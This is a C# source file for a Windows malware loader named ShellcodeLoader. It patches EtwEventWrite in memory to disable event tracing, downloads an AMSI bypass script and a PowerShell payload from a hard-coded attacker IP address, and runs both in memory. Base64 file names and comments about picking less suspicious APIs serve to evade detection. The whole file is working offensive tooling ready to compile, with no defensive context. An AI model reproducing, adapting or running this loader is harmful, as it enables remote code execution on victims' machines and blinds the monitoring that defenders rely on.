using System;
using System.Net;
using System.Text;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Reflection;
using System.Runtime.InteropServices;

namespace ShellcodeLoader
{
    class Program
    {
        // Import EtwEventWrite to patch for ETW bypass
        [DllImport("ntdll.dll", CharSet = CharSet.Unicode)]
        public static extern int EtwEventWrite(IntPtr regHandle, ref EVENT_DESCRIPTOR eventDescriptor, int userDataCount, IntPtr userData);

        [StructLayout(LayoutKind.Sequential)]
        public struct EVENT_DESCRIPTOR
        {
            public ushort Id;
            public byte Version;
            public byte Channel;
            public byte Level;
            public byte Opcode;
            public ushort Task;
            public ulong Keyword;
        }

        static void Main(string[] args)
        {
            try
            {
                // <<<<<<<<<<< CHANGE THIS IP BEFORE COMPILING >>>>>>>>>>>
                string attackerIP = "192.168.1.94";

                Console.WriteLine("[*] Patching ETW to disable telemetry...");
                PatchETW();

                Console.WriteLine("[*] Executing AMSI bypass...");
                string amsiPath = Obf("YW1zaS50eHQ="); // "amsi.txt"
                string amsiUrl = $"http://{attackerIP}/{amsiPath}";
                string amsiBypass = GetStringFromUrl(amsiUrl);
                ExecutePowerShell(amsiBypass);

                Console.WriteLine("[*] Downloading PowerShell payload...");
                string shellPath = Obf("c2hlbGwucHMx"); // "shell.ps1"
                string psUrl = $"http://{attackerIP}/{shellPath}";
                string psScript = GetStringFromUrl(psUrl);
                ExecutePowerShell(psScript);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error: " + ex.Message);
            }
        }

        // Executes a given PowerShell script string in memory using Runspace
        static void ExecutePowerShell(string script)
        {
            using (PowerShell ps = PowerShell.Create())
            {
                ps.AddScript(script);
                ps.Invoke();
            }
        }

        // Decodes Base64-encoded strings (used for basic obfuscation)
        static string Obf(string base64)
        {
            byte[] data = Convert.FromBase64String(base64);
            return Encoding.UTF8.GetString(data);
        }

        // Retrieves a string from a URL using HttpWebRequest (less suspicious than WebClient)
        static string GetStringFromUrl(string url)
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "GET";
            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            using (System.IO.StreamReader reader = new System.IO.StreamReader(response.GetResponseStream()))
            {
                return reader.ReadToEnd();
            }
        }

        // Patches EtwEventWrite to immediately return (bypassing ETW logging)
        static void PatchETW()
        {
            IntPtr ntdll = GetModuleHandle("ntdll.dll");
            IntPtr addr = GetProcAddress(ntdll, "EtwEventWrite");
            uint oldProtect;
            VirtualProtect(addr, (UIntPtr)4, 0x40, out oldProtect);
            Marshal.Copy(new byte[] { 0xC3 }, 0, addr, 1); // ret
        }

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
}

